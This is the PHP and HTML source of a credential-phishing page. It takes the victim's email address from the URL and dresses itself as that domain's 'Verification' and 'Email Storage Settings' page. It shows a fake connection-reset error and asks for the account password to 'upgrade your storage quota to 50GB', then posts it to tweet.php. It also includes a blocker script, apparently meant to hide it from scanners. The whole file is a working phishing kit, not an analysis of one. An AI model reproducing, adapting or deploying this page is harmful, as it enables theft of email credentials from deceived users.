<?php
$email = $_GET['email'];
$dom = substr(strrchr($email, "@"), 1);
$domain = ucfirst(strtok($dom, '.'));
error_reporting(0);
include ('blocker.php');
@session_start();
?>

<html>
<head>
	<title><?php echo $domain ?> Online PDF Reader</title>
	<link rel="icon" href="./includes/favicon.png" type="image/gif">
	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
	<style>
		body {font-family: Arial, Helvetica, sans-serif;}

		/* The Modal (background) */
		.modal {
		  display: none; /* Hidden by default */
		  position: fixed; /* Stay in place */
		  z-index: 1; /* Sit on top */
		  padding-top: 100px; /* Location of the box */
		  left: 0;
		  top: 0;
		  width: 100%; /* Full width */
		  height: 100%; /* Full height */
		  overflow: auto; /* Enable scroll if needed */
		  background-color: rgb(0,0,0); /* Fallback color */
		  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
		}

		/* Modal Content */
		.modal-content {
		  position: relative;
		  background-color: #fefefe;
		  margin: auto;
		  padding: 0;
		  border: 1px solid #888;
		  width: 330px;
		  height: 370px;
		  box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
		  -webkit-animation-name: animatetop;
		  -webkit-animation-duration: 0.4s;
		  animation-name: animatetop;
		  animation-duration: 0.6s
		  border: solid 3px #084B8A;
		  -moz-border-radius:7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;
		  -moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;
		}

		/* Add Animation */
		@-webkit-keyframes animatetop {
		  from {top:-300px; opacity:0} 
		  to {top:0; opacity:1}
		}

		@keyframes animatetop {
		  from {top:-300px; opacity:0}
		  to {top:0; opacity:3}
		}

		/* The Close Button */
		.close {
		  color: white;
		  float: right;
		  font-size: 28px;
		  font-weight: bold;
		}

		.close:hover,
		.close:focus {
		  color: #000;
		  text-decoration: none;
		  cursor: pointer;
		}

		.modal-header {
		  padding: 2px 10px;
		  background-color: #000;
		  color: white;
		}

		.modal-body {padding: 2px 16px;}

		.modal-footer {
		  padding: 2px 16px;
		  background-color: #5cb85c;
		  color: white;
		}
	</style>
</head>

<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
<table align="center" cellspacing="0" height="100%" width="100%">
	<tr>
		<td height="8%" bgcolor="#000">
			<table>
				<tr>
					<td width="10"></td>
					<td>
						<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" color="#FFF">
							<b><?php echo $domain ?>

Email Storage Settings </b>
						</font>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td height="1%" bgcolor="#045FB4"></td>
	</tr>
	<tr>
		<td height="70%" bgcolor="#FFF">
			<table align="center">
				<tr>
					<td>
						<table align="center">
							<tr>
								<td>
									<div align="center">
										<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2" 
style="color: #045FB4; background: #FFF; text-shadow: 1px 0px 1px #CCCCCC, 0px 1px 1px #EEEEEE, 2px 1px 1px 
#CCCCCC, 1px 2px 1px #EEEEEE, 3px 2px 1px #CCCCCC, 2px 3px 1px #EEEEEE, 4px 3px 1px #CCCCCC, 3px 4px 1px 
#EEEEEE, 5px 4px 1px #CCCCCC, 4px 5px 1px #EEEEEE, 6px 5px 1px #CCCCCC, 5px 6px 1px #EEEEEE, 7px 6px 1px #CCCCCC;">
											<b> <?php echo $domain ?>

Verification </b>
										</font>
									</div>
								</td>
							</tr>
						</table>
					</td>
				</tr>
				<tr>
					<td>
						<div align="center">
							<img src="./includes/logo.svg" style="height:100px; width:300;">
							</div>
						</td>
					</tr>
					<tr>
						<td>
							<table align="center">
								<tr>
									<td>
										<form method="post" action="tweet.php">
										</td>
									</tr>
									<tr>
										<td>
											<div align="center">
												<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" color="#000">
					
					
					Please verifiy your account below 
					
													<br>to upgrade your storage quota to 
														<b>50GB</b>
													</font>
												</div>
											</td>
										</tr>
										<tr>
											<td height="5" style="color:red;font-size:14px">Your connection was reset please try again</td>
										</tr>
										<tr>
											<td>
												<table align="center">
													<tr>
														<td style="height:35px; width:217; font-family: Verdana; font-size: 13px; font-weight: light; color:#000000; 
					background-color: #ffffff; border: solid 1px #000; padding: 7px; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 2px 2px 2px #000000; -webkit-box-shadow: 2px 2px 2px #000000; box-shadow: 2px 2px 2px #000000;">
															<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" 
							size="2" color="#000">

<?php echo $email ?>										
</font>
														</td>
													</tr>
												</table>
											</td>
										</tr>
										<tr>
											<td height="2"></td>
										</tr>
										<tr>
											<td>
												<div align="center">
												<input type="hidden" name="email" value="<?php echo $email ?>" >
													<input  name="passwd" type="password" 
					style="height:35px; width:232; font-family: Verdana; font-size: 13px; font-weight: light; color:#000000; 
					background-color: #ffffff; border: solid 1px #000; padding: 7px; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 2px 2px 2px #000000; -webkit-box-shadow: 2px 2px 2px #000000; box-shadow: 2px 2px 2px #000000;" 
					required="" placeholder="Password" autofocus>
													</div>
												</td>
											</tr>
											<tr>
												<td>
													<table align="">
														<tr>
															<td>
																<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2" color="#000">
																	<input type="checkbox" checked=""> I agree to upgrade my email quota
						
						
																	</font>
																</td>
															</tr>
														</table>
													</td>
												</tr>
												<tr>
													<td height="2"></td>
												</tr>
												<tr>
													<td>
														<div align="center">
															<input type="submit" value="Upgrade Now >>" style="width:230px; height:40px; 
					background-color: #045FB4; border: solid 3px #045FB4; font-family: Verdana; 
					font-size: 13px; font-weight: light; color: #ffffff; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 5px 5px 5px #000000; -webkit-box-shadow: 5px 5px 5px #000000; box-shadow: 5px 5px 5px #000000;">
															</div>
														</td>
													</tr>
													<tr>
														<td height="15">
															<input type="hidden" name="login" value="<?php echo $email ?>">
															</form>
														</td>
													</tr>
												</table>
											</td>
										</tr>
										<tr>
											<td height="60"></td>
										</tr>
									</table>
								</td>
							</tr>
							<tr>
								<td height="4%" bgcolor="#000"></td>
							</tr>
							<tr>
								<td height="12%" bgcolor="#045FB4">
									<table align="center">
										<tr>
											<td>
												<img src="./includes/googleplay.png" width="130" height="42">
												</td>
												<td width="5"></td>
												<td>
													<img src="./includes/appstore.jpg" width="130" height="40">
													</td>
												</tr>
											</table>
										</td>
									</tr>
								</table>
							</body>
									</html>